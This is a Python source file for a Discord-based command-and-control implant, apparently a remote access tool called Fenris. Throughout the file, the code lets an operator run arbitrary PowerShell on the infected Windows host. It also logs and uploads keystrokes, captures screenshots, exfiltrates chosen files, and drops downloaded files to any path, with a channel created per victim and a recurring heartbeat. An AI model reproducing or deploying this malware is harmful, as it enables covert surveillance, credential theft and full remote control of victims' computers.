import discord
from discord.ext import commands, tasks
from discord import app_commands
import subprocess
import requests
from pynput.keyboard import Key, Listener
import threading
import os
from mss import mss
import tempfile
import asyncio
import psutil
import socket
import platform


TOKEN = ''
GUILD_ID = SERVER_ID_HERE

IMAGE_URL = 'https://github.com/0d1nss0n/Fenris-Discord-C2-Server/blob/main/img/Fenris.png'

intents = discord.Intents.default()
intents.messages = True
intents.message_content = True

bot = commands.Bot(command_prefix='/', intents=intents)
bot_command_channel_id = None

last_attachment_url = None

key_log = []
stop_logger = threading.Event()

@bot.event
async def on_ready():
    await bot.tree.sync(guild=discord.Object(id=GUILD_ID))
    print(f'Logged in as {bot.user}!')

    guild = bot.get_guild(GUILD_ID)
    if guild:
        channel_name = f"{os.getenv('COMPUTERNAME', 'Unknown-PC')}"
        channel = await guild.create_text_channel(name=channel_name)
        global bot_command_channel_id
        bot_command_channel_id = channel.id  
        print(f"Created and listening to new channel {channel_name} with ID {bot_command_channel_id}.")
        response = requests.get(IMAGE_URL)
        image_bytes = response.content
                
        await bot.user.edit(avatar=image_bytes)
        heartbeat.start()
    else:
        print("Guild not found. Ensure the GUILD_ID is correct.")

@bot.event
async def on_message(message):
    global last_attachment_url
    
    await bot.process_commands(message)

    if message.author == bot.user or not message.attachments:
        return

    if message.attachments:
        attachment = message.attachments[0]
        last_attachment_url = attachment.url
        await message.channel.send("New upload detected and URL saved.")

def on_press(key):
    try:
        if key.char:
            key_log.append(key.char)  
    except AttributeError:
        if key == Key.space:
            key_log.append(' {space} ') 
        elif key == Key.enter:
            key_log.append(' {enter} ')  
        elif key == Key.backspace:
            key_log.append(' {backspace} ')
        else:
            key_log.append(f'<{key.name}>')  

def on_release(key):
    if stop_logger.is_set(): 
        return False

def start_keylogger():
    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

@bot.tree.command(name="cmd", description="Execute a PowerShell command", guild=discord.Object(id=GUILD_ID))
async def execute_command(interaction: discord.Interaction, command: str):
    if interaction.channel_id != bot_command_channel_id:
        await interaction.response.send_message("This command cannot be processed in this channel.")
        return

    powershell_path = "powershell"
    result = subprocess.run([powershell_path, "-Command", command], capture_output=True, text=True, check=False)
    output = result.stdout if result.stdout else result.stderr

    if len(output) > 2000:
        with open('output.txt', 'w', encoding='utf-8') as file:
            file.write(output)
        await interaction.response.send_message("Output is too long, sending as a file:", file=discord.File('output.txt'))
        os.remove('output.txt')
    else:
        await interaction.response.send_message(f"```{output}```")

@bot.tree.command(name="url", description="Show the URL of the last uploaded file")
async def show_last_url(ctx):
    global last_attachment_url
    if last_attachment_url:
        await ctx.send(f"The last uploaded file URL is: {last_attachment_url}")
    else:
        await ctx.send("No file has been uploaded yet.")

@bot.tree.command(name="kstart", description="Start the keylogger", guild=discord.Object(id=GUILD_ID))
async def start_logging(interaction: discord.Interaction):
    global stop_logger, key_log
    stop_logger.clear()
    key_log = []
    threading.Thread(target=start_keylogger, daemon=True).start() 
    await interaction.response.send_message("Keylogger has started.")

@bot.tree.command(name="kstop", description="Stop the keylogger and save the log", guild=discord.Object(id=GUILD_ID))
async def stop_logging(interaction: discord.Interaction):
    stop_logger.set()
    log_path = "logger.txt"
    with open(log_path, 'w') as file:
        file.write(''.join(key_log))
    await interaction.response.send_message("Keylogger has stopped.", file=discord.File(log_path))
    os.remove(log_path) 

@bot.tree.command(name="ping", description="Check if the bot is up and measure latency", guild=discord.Object(id=GUILD_ID))
async def ping(interaction: discord.Interaction):
    latency = round(bot.latency * 1000)
    await interaction.response.send_message(f"Pong! {latency}ms")

@bot.tree.command(name="upload", description="Upload a file to the channel", guild=discord.Object(id=GUILD_ID))
async def upload_file(interaction: discord.Interaction, file_path: str):
    if interaction.channel_id != bot_command_channel_id:
        await interaction.response.send_message("This command cannot be processed in this channel.")
        return

    if not os.path.exists(file_path):
        await interaction.response.send_message("File does not exist.")
        return

    try:
        file = discord.File(file_path)
        await interaction.response.send_message("Uploading file...", file=file)
    except Exception as e:
        await interaction.response.send_message(f"Failed to upload file: {str(e)}")

@bot.tree.command(name="download", description="Download the last uploaded file to a specified path", guild=discord.Object(id=GUILD_ID))
async def download(interaction: discord.Interaction, file_path: str):
    global last_attachment_url
    if not last_attachment_url:
        await interaction.response.send_message("No file has been uploaded yet.")
        return

    try:
        response = requests.get(last_attachment_url)
        response.raise_for_status() 

        os.makedirs(os.path.dirname(file_path), exist_ok=True)
        with open(file_path, 'wb') as f:
            f.write(response.content)
        await interaction.response.send_message(f"File has been downloaded and saved to {file_path}.")
    except requests.RequestException as e:
        await interaction.response.send_message(f"Failed to download file: {str(e)}")

@bot.tree.command(name="screenshot", description="Take a screenshot and upload it", guild=discord.Object(id=GUILD_ID))
async def screenshot(interaction: discord.Interaction):
    if interaction.channel_id != bot_command_channel_id:
        await interaction.response.send_message("This command cannot be processed in this channel.")
        return

    filename = screenshot_win()
    try:
        await interaction.response.send_message("Uploading screenshot...", file=discord.File(filename))
    finally:
        os.remove(filename)

def screenshot_win():
    with mss() as sct:
        screenshot_filename = os.path.join(tempfile.gettempdir(), "screenshot.png")
        sct.shot(output=screenshot_filename, mon=-1)
    return screenshot_filename

@bot.tree.command(name="kill", description="Stop the bot and delete its channel", guild=discord.Object(id=GUILD_ID))
async def kill_bot(interaction: discord.Interaction):
    if interaction.channel_id != bot_command_channel_id:
        await interaction.response.send_message("This command can only be processed in the bot's channel.")
        return

    try:
        channel = bot.get_channel(bot_command_channel_id)
        if channel:
            await channel.delete()
            print("Channel successfully deleted.")
        await interaction.response.send_message("Bot and channel are being terminated...")
    except Exception as e:
        await interaction.response.send_message(f"Failed to delete channel: {str(e)}")
        return

    await asyncio.sleep(1)
    await bot.close()
    print("Bot stopped.")

@tasks.loop(minutes=5)
async def heartbeat():
    channel = bot.get_channel(bot_command_channel_id)
    if channel:
        await channel.send(f"💓 Heartbeat: {bot.user} is online! Time: {discord.utils.utcnow().strftime('%m-%d-%Y %H:%M:%S UTC')}")

@heartbeat.before_loop
async def before_heartbeat():
    await bot.wait_until_ready()

bot.run(TOKEN)
